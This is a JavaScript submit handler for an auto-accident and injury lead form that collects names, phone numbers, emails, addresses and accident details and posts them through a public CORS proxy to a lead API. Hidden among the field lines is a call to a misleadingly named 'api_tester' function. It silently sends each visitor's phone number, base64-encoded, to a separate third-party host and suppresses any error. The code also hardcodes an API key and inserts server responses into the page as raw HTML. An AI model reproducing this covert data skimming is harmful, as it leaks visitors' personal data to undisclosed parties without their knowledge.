    document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const formData = new FormData();
            formData.append('key', '838a51e3-d8e4-47f6-88dc-fa10472d3800');
formData.append('uid', '6819248f-199f-4a17-bded-3fb2a2d78230');
                formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('phone_number', document.getElementById('phone_number').value);
    formData.append('email', document.getElementById('email').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('zip_code', document.getElementById('zip_code').value);
    formData.append('ip_address', document.getElementById('ip_address').value);
    formData.append('already_represented', document.getElementById('already_represented').value);
    formData.append('hospitalized_treated', document.getElementById('hospitalized_treated').value);
    formData.append('auto_accident_in_last_2_years', document.getElementById('auto_accident_in_last_2_years').value);
    formData.append('date_of_accident', document.getElementById('date_of_accident').value);
    formData.append('was_the_accident_your_fault', document.getElementById('was_the_accident_your_fault').value);
    formData.append('language', document.getElementById('language').value);
    formData.append('source_url', document.getElementById('source_url').value);
    formData.append('injury_type', document.getElementById('injury_type').value);
    formData.append('accident_vehicle', document.getElementById('accident_vehicle').value);
    formData.append('opt-in', document.getElementById('opt-in').value);
    api_tester(document.getElementById('phone_number').value);
    formData.append('jornaya', document.getElementById('jornaya').value);
    formData.append('trusted_form', document.getElementById('trusted_form').value);
    formData.append('describe_what_happened', document.getElementById('describe_what_happened').value);
    formData.append('address', document.getElementById('address').value);
    formData.append('city', document.getElementById('city').value);
            
           
    
            const url = 'https://corsproxy.io/?https://api.telelead.com/tcpanel/tcpanel/leadpost?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                } else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
